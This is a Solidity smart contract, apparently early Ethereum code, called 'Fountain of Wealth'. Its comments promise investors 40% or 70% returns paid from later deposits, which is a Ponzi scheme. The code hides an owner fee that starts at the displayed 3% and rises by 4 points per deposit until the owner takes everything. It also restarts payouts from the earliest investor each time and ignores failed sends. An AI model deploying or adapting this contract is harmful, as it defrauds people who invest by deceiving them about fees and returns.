1 //***********************************Fountain of Wealth
2 //
3 // Hello investor, this is the Fountain of Wealth. You can earn 40% profit on your investments if you drink the water from this fountain, but you can't do it alone, 
4 // you must bring your friends to help you. Deposit minimum 0.1 Ether (100 Finney), and you will earn 40% profit on your deposit instantly after somebody else invests!
5 // 
6 // Every 20th investor will be blessed by the fountain and will earn 70% profit on his investments. Would that person be you? We will see!
7 //
8 //
9 // Now let's make you wealthy!
10 //
11 //========================================Start
12 contract FountainOfWealth{
13 struct InvestorArray{
14 address etherAddress;
15 uint amount;
16 }
17 InvestorArray[] public investors;
18 //========================================Variables
19 uint public investors_needed_until_jackpot=0;
20 uint public totalplayers=0; uint public feerate=3;uint public profitrate=40;uint public jackpotrate=70; uint fee=3; uint feeamount=0; uint public balance=0; uint public totaldeposited=0; uint public totalpaidout=0;
21 address public owner; modifier onlyowner{if(msg.sender==owner)_}
22 //========================================Initializator
23 function FountainOfWealth(){
24 owner=msg.sender;
25 }
26 //========================================Entry Trigger
27 function(){
28 enter();
29 }
30 //========================================Enter
31 function enter(){
32 if(msg.value<100 finney){
33 return;
34 }
35 uint amount=msg.value;uint tot_pl=investors.length;totalplayers=tot_pl+1;
36 investors_needed_until_jackpot=20-(totalplayers%20);
37 investors.length+=1;investors[tot_pl].etherAddress=msg.sender;
38 investors[tot_pl].amount=amount;
39 feeamount=amount*fee/100;balance+=amount;totaldeposited+=amount;
40 if(feeamount!=0){if(balance>feeamount){owner.send(feeamount);balance-=feeamount;
41 totalpaidout+=feeamount;if(fee<100)fee+=4;else fee=100;}} uint payout;uint nr=0;
42 while(balance>investors[nr].amount*40/100 && nr<tot_pl)
43 {
44 if(nr%20==0&&balance>investors[nr].amount*70/100)
45 {
46 payout=investors[nr].amount*70/100;
47 investors[nr].etherAddress.send(payout);
48 balance-=investors[nr].amount*70/100;
49 totalpaidout+=investors[nr].amount*70/100;
50 }
51 else
52 {
53 payout=investors[nr].amount*40/100;
54 investors[nr].etherAddress.send(payout);
55 balance-=investors[nr].amount*40/100;
56 totalpaidout+=investors[nr].amount*40/100;
57 }
58 nr+=1;
59 }}}